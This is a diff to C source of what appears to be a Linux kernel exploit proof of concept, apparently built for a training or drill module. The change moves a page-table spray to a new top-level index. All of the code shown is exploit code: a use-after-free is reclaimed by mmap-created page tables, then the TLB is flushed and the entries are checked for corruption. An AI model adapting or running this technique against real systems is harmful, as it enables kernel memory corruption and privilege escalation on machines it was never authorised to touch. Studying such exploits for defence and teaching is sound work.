@@ -115,13 +115,15 @@ int act(int act_fd, int code, int n, char *args)
 /* Page table bits: Dirty | Accessed | User | Write | Present */
 #define PT_BITS 0x67
 
+#define PGD_N 64
+
 int prepare_page_tables(void)
 {
 	unsigned long *addr = NULL;
 	long i = 0;
 
 	/* Allocate page table hierarchy */
-	addr = mmap(PT_INDICES_TO_VIRT(1, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
+	addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 0, 0, 0), PAGE_SIZE, PROT_WRITE,
 			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (addr == MAP_FAILED) {
 		perror("[-] mmap");
@@ -134,7 +136,7 @@ int prepare_page_tables(void)
 	 * the freed slab containing UAF object.
 	 */
 	for (i = 0; i < PT_ENTRIES; i++) {
-		addr = mmap(PT_INDICES_TO_VIRT(1, 0, 1, i, 0), PAGE_SIZE, PROT_WRITE,
+		addr = mmap(PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0), PAGE_SIZE, PROT_WRITE,
 			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 		if (addr == MAP_FAILED) {
 			perror("[-] mmap");
@@ -388,7 +390,7 @@ int main(void)
 
 	printf("[!] create a page table to reclaim the freed memory\n");
 	for (unsigned long long i = 0; i < PT_ENTRIES; i++) {
-		*(unsigned int *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
+		*(unsigned int *)PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
 	}
 	printf("[+] done, vulnerable page table has been created\n");
 
@@ -402,11 +404,11 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	flush_tlb(PT_INDICES_TO_VIRT(1, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */
+	flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
 	for (int i = 0; i < PT_ENTRIES; i++) {
-		unsigned int *ptr = (unsigned int *)PT_INDICES_TO_VIRT(1, 0, 1, i, 0);
-		void *virt_address = PT_INDICES_TO_VIRT(1, 0, 1, i, 0);
+		unsigned int *ptr = (unsigned int *)PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
+		void *virt_address = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
 		unsigned int value = *ptr;
 
 		if (value != 0xcafecafe) {
